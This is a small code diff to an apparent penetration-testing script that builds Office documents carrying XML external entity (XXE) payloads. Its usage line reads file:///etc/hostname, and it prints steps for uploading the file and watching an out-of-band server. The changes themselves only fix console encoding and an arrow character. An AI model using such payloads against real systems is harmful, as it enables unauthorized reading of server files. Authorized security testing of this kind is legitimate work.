@@ -13,6 +13,10 @@ Usage:
   python3 make_ooxml_xxe.py clean.xlsx evil.xlsx --file file:///etc/hostname   # in-band (needs the app to reflect it)
 """
 import argparse, os, shutil, sys, tempfile, zipfile
+try:
+    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # never crash a cp1252 console
+except Exception:
+    pass
 
 PART = {".docx": "word/document.xml", ".xlsx": "xl/workbook.xml", ".pptx": "ppt/presentation.xml"}
 
@@ -71,7 +75,7 @@ def main():
                     z.write(full, os.path.relpath(full, tmp))
         print(f"[+] wrote {a.out}  (injected into {part})")
         print(f"    DOCTYPE: {doctype}")
-        print("    Upload to a doc-parsing feature. Blind-OOB → watch oob_server.py. DELETE the artifact after (§19).")
+        print("    Upload to a doc-parsing feature. Blind-OOB -> watch oob_server.py. DELETE the artifact after (§19).")
     finally:
         shutil.rmtree(tmp, ignore_errors=True)
 
